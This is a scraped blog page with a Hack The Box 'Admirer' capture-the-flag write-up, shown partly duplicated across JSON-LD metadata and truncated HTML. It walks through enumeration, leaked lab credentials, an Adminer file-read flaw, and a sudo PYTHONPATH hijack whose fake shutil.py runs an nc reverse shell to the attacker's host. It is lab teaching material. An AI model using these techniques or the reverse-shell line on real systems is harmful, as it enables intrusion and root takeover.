PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh [[[ System Administration Menu ]]] 1) View system uptime 2) View logged in users 3) View crontab 4) Backup passwd file 5) Backup shadow file 6) Backup web data 7) Backup DB 8) Quit Choose an option: 6 Running backup script in the background, it might take a while... root.txt And on our listener we prepared beforehand, 1 2 3 4 5 6 7 $ nv -lvnp 1337 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.187] 56858 id uid=0(root) gid=0(root) groups=0(root) cat /root/root.txt 5049XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/admirer-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/admirer-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-27T02:56:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Admirer" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/admirer-htb/"},"description":"Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.187 admirer.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ nmap -sV -sT -sC admirer.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 07:58 EDT Nmap scan report for admirer.htb (10.10.10.187) Host is up (0.19s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA) | 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA) |_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin-dir |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Admirer Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.47 seconds Enumeration (1) There was no anonymous access for the ftp service on port 21 and we didn’t have any credentials for the ssh service on port 22 so lets move straight to the http service on port 80. Very nice home page but its not linked to any useful pages. Hmm… Lets check out robots.txt. Unfortunately, accessing http://admirer.htb/admin-dir/ led to a 403, so I think its time to bust out the directory brute-forcer. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ gobuster dir -u http://admirer.htb/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 12 -k -x .php,.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://admirer.htb/admin-dir [+] Threads: 12 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2020/05/28 08:31:50 Starting gobuster =============================================================== /contacts.txt (Status: 200) /credentials.txt (Status: 200) Lets visit them. http://admirer.htb/admin-dir/contacts.txt: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ########## # admins # ########## # Penny Email: p.wise@admirer.htb ############## # developers # ############## # Rajesh Email: r.nayyar@admirer.htb # Amy Email: a.bialik@admirer.htb # Leonard Email: l.galecki@admirer.htb ############# # designers # ############# # Howard Email: h.helberg@admirer.htb # Bernadette Email: b.rauch@admirer.htb http://admirer.htb/admin-dir/credentials.txt: 1 2 3 4 5 6 7 8 9 10 11 [Internal mail account] w.cooper@admirer.htb fgJr6q#S\\W:$P [FTP account] ftpuser %n?4Wz}R$tTF7 [Wordpress account] admin w0rdpr3ss01! Using the ftp credentials we found, we can go back to the ftp service. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ftp admirer.htb Connected to admirer.htb. 220 (vsFTPd 3.0.3) Name (admirer.htb:root): ftpuser 331 Please specify the password. Password: %n?4Wz}R$tTF7 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 3405 Dec 02 2019 dump.sql -rw-r--r-- 1 0 0 5270987 Dec 03 2019 html.tar.gz 226 Directory send OK. We see 2 files so lets download them and analyse them. The dump.sql contained nothing useful so lets see what’s inside of html.tar.gz 1 2 3 4 5 6 7 8 9 10 11 12 $ tar -xvf html.tar.gz $ ls -al total 5188 drwxr-xr-x 6 root root 4096 May 28 08:43 . drwxr-xr-x 27 root root 4096 Aug 22 05:34 .. drwxr-x--- 6 root www-data 4096 Jun 6 2019 assets -rw-r--r-- 1 root root 5270987 May 28 08:42 html.tar.gz drwxr-x--- 4 root www-data 4096 Dec 2 2019 images -rw-r----- 1 root www-data 4613 Dec 3 2019 index.php -rw-r----- 1 root www-data 134 Dec 1 2019 robots.txt drwxr-x--- 2 root www-data 4096 May 28 09:38 utility-scripts drwxr-x--- 2 root www-data 4096 Dec 2 2019 w4ld0s_s3cr3t_d1r In this folder were 3 interesting files. 1 2 3 4 5 6 7 8 $ index.php ... &lt;?php $servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;; $dbname = &quot;admirerdb&quot;; ... Alright, we got one set of credentials. In utility-scripts, there was a admin_tasks.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 &lt;html&gt; &lt;head&gt; &lt;title&gt;Administrative Tasks&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt; &lt;?php // Web Interface to the admin_tasks script // if(isset($_REQUEST[&#39;task&#39;])) { $task = $_REQUEST[&#39;task&#39;]; if($task == &#39;1&#39; || $task == &#39;2&#39; || $task == &#39;3&#39; || $task == &#39;4&#39; || $task == &#39;5&#39; || $task == &#39;6&#39; || $task == &#39;7&#39;) { /*********************************************************************************** Available options: 1) View system uptime 2) View logged in users 3) View crontab (current user only) 4) Backup passwd file (not working) 5) Backup shadow file (not working) 6) Backup web data (not working) 7) Backup database (not working) NOTE: Options 4-7 are currently NOT working because they need root privileges. I&#39;m leaving them in the valid tasks in case I figure out a way to securely run code as root from a PHP page. ************************************************************************************/ echo str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, shell_exec(&quot;/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1&quot;)); } else { echo(&quot;Invalid task.&quot;); } } ?&gt; &lt;p&gt; &lt;h4&gt;Select task:&lt;/p&gt; &lt;form method=&quot;POST&quot;&gt; &lt;select name=&quot;task&quot;&gt; &lt;option value=1&gt;View system uptime&lt;/option&gt; &lt;option value=2&gt;View logged in users&lt;/option&gt; &lt;option value=3&gt;View crontab&lt;/option&gt; &lt;option value=4 disabled&gt;Backup passwd file&lt;/option&gt; &lt;option value=5 disabled&gt;Backup shadow file&lt;/option&gt; &lt;option value=6 disabled&gt;Backup web data&lt;/option&gt; &lt;option value=7 disabled&gt;Backup database&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; If we visit it, this is how it looks: We can’t inject any arbitrary commands into the shell_exec since the if check is pretty tight. Moving on, there was another file called db_admin.php. 1 2 3 4 5 6 7 8 9 10 $ cat utility-scripts/db_admin.php ... $servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;Wh3r3_1s_w4ld0?&quot;; // Create connection $conn = new mysqli($servername, $username, $password); ... // TODO: Finish implementing this or find a better open source alternative Cool we found some database credentials but we can’t use them yet. However this page doesn’t exist anymore. Could it have to do with the comment in db_admin.php? I consulted the forums and people were saying that the name of this box was a hint. I went to google “open source admirer” and I found what they were talking about. 1 2 3 Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB. ... Usage: Just put the file adminer.css alongside adminer.php. The usage tells us that there is a adminer.php, so lets see if it’s there. http://admirer.htb/utility-scripts/adminer.php: Exploitation (1) We found our next lead! I tested out the credentials we found but they were incorrect :( Maybe the files we found were outdated? Searching online, this version of Adminer (4.6.2) has a vulnerability which allows us to read files on the web server. I followed this guide which allowed to me read index.php on the web server. First, we will need a SQL server. Fortunately, Kali Linux already comes with MariaDB installed so all we have to do is start it. 1 $ systemctl start mysql Next, we will need to create a new account and assign privileges to it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ mysql Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 39 Server version: 10.3.20-MariaDB-1 Debian buildd-unstable Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MariaDB [(none)]&gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [(none)]&gt; CREATE USER &#39;root&#39;@&#39;admirer.htb&#39; IDENTIFIED BY &#39;toor&#39;; Query OK, 0 rows affected (0.000 sec) MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON * . * TO &#39;root&#39;@&#39;admirer.htb&#39;; Query OK, 0 rows affected (0.000 sec) Now we can use adminer.php to access our MariaDB server by entering our attacker’s machine IP Address as the Server, root as the username and toor as the password. The database field can be left blank. We then need to create a new database and new table inside it. Now, we can proceed to load the contents of index.php into the table we made. And finally, we can view the contents of index.php. We can use these new credentials to login to the database on the box but there was only one table which contained nothing useful. user.txt Thinking back, there was a ssh service running port 22. Perhaps we can ssh with the credentials? 1 2 3 4 $ ssh waldo@admirer.htb waldo@admirer.htb&#39;s password: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt; waldo@admirer:~$ cat user.txt a9f7XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) As waldo, we got sudo rights to run /opt/scripts/admin_tasks.sh. 1 2 3 4 5 6 7 waldo@admirer:~$ sudo -l [sudo] password for waldo: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt; Matching Defaults entries for waldo on admirer: env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=always User waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh Lets see what’s inside. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh #!/bin/bash view_uptime() { /usr/bin/uptime -p } view_users() { /usr/bin/w } view_crontab() { /usr/bin/crontab -l } backup_passwd() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot; /bin/cp /etc/passwd /var/backups/passwd.bak /bin/chown root:root /var/backups/passwd.bak /bin/chmod 600 /var/backups/passwd.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_shadow() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot; /bin/cp /etc/shadow /var/backups/shadow.bak /bin/chown root:shadow /var/backups/shadow.bak /bin/chmod 600 /var/backups/shadow.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_web() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running backup script in the background, it might take a while...&quot; /opt/scripts/backup.py &amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } backup_db() { if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running mysqldump in the background, it may take a while...&quot; #/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp; /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi } # Non-interactive way, to be used by the web interface if [ $# -eq 1 ] then option=$1 case $option in 1) view_uptime ;; 2) view_users ;; 3) view_crontab ;; 4) backup_passwd ;; 5) backup_shadow ;; 6) backup_web ;; 7) backup_db ;; *) echo &quot;Unknown option.&quot; &gt;&amp;2 esac exit 0 fi # Interactive way, to be called from the command line options=(&quot;View system uptime&quot; &quot;View logged in users&quot; &quot;View crontab&quot; &quot;Backup passwd file&quot; &quot;Backup shadow file&quot; &quot;Backup web data&quot; &quot;Backup DB&quot; &quot;Quit&quot;) echo echo &quot;[[[ System Administration Menu ]]]&quot; PS3=&quot;Choose an option: &quot; COLUMNS=11 select opt in &quot;${options[@]}&quot;; do case $REPLY in 1) view_uptime ; break ;; 2) view_users ; break ;; 3) view_crontab ; break ;; 4) backup_passwd ; break ;; 5) backup_shadow ; break ;; 6) backup_web ; break ;; 7) backup_db ; break ;; 8) echo &quot;Bye!&quot; ; break ;; *) echo &quot;Unknown option.&quot; &gt;&amp;2 esac done exit 0 It’s quite long but if we zoom in to the backup_web function, we see that it is running a python script /opt/scripts/backup.py. 1 2 3 4 5 6 7 8 9 10 11 12 13 waldo@admirer:~$ cat /opt/scripts/backup.py #!/usr/bin/python3 from shutil import make_archive src = &#39;/var/www/html/&#39; # old ftp directory, not used anymore #dst = &#39;/srv/ftp/html&#39; dst = &#39;/var/backups/html&#39; make_archive(dst, &#39;gztar&#39;, src) This script simply creates a .tar.gz file from the contents of /var/backups/html. Exploitation (2) Hmm… How does the SETENV in the sudo rights come into place? With SETENV, we are able to set/modify environment variables when running the script with sudo. For example, I can do this: sudo x=something /opt/scripts/admin_tasks.sh and the script will run with the environment variable x set to something. Since we know that the script executes make_archive from the shutil module, what we can do is create a fake shutil module with a fake make_archive function and modify the $PYTHONPATH variable to point to the location of our fake module and run the script! The $PYTHONPATH contains a list of additional directories where Python looks for modules for importing. 1 2 3 4 5 6 waldo@admirer:~$ cat shutil.py import os def make_archive(a,b,c): os.system(&quot;nc 10.10.XX.XX 1337 -e /bin/bash&quot;) Now, all we have to do is run admin_task.sh. 1 2 3 4 5 6 7 8 9 10 11 12 13 waldo@admirer:/tmp$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh [[[ System Administration Menu ]]] 1) View system uptime 2) View logged in users 3) View crontab 4) Backup passwd file 5) Backup shadow file 6) Backup web data 7) Backup DB 8) Quit Choose an option: 6 Running backup script in the background, it might take a while... root.txt And on our listener we prepared beforehand, 1 2 3 4 5 6 7 $ nv -lvnp 1337 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.187] 56858 id uid=0(root) gid=0(root) groups=0(root) cat /root/root.txt 5049XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/admirer-htb/","@type":"BlogPosting","headline":"Hack The Box - Admirer","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-09-27T02:56:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Admirer | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Admirer</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Admirer</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Sep 27, 2020, 2:56 AM +0800" > Sep 27, 2020 <i class="unloaded">2020-09-27T02:56:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2376 words">13 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.187 admirer.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> admirer.htb
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-05-28 07:58 EDT
+Nmap scan report <span class="k">for </span>admirer.htb <span class="o">(</span>10.10.10.187<span class="o">)</span>
+Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>23.47 seconds
+
+</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>There was no anonymous access for the <code class="language-plaintext highlighter-rouge">ftp</code> service on port <code class="language-plaintext highlighter-rouge">21</code> and we didn’t have any credentials for the <code class="language-plaintext highlighter-rouge">ssh</code> service on port <code class="language-plaintext highlighter-rouge">22</code> so lets move straight to the <code class="language-plaintext highlighter-rouge">http</code> service on port <code class="language-plaintext highlighter-rouge">80</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer1.png" alt="" /></p><p>Very nice home page but its not linked to any useful pages. Hmm… Lets check out <code class="language-plaintext highlighter-rouge">robots.txt</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/admirer2.png" alt="" /></p><p>Unfortunately, accessing <code class="language-plaintext 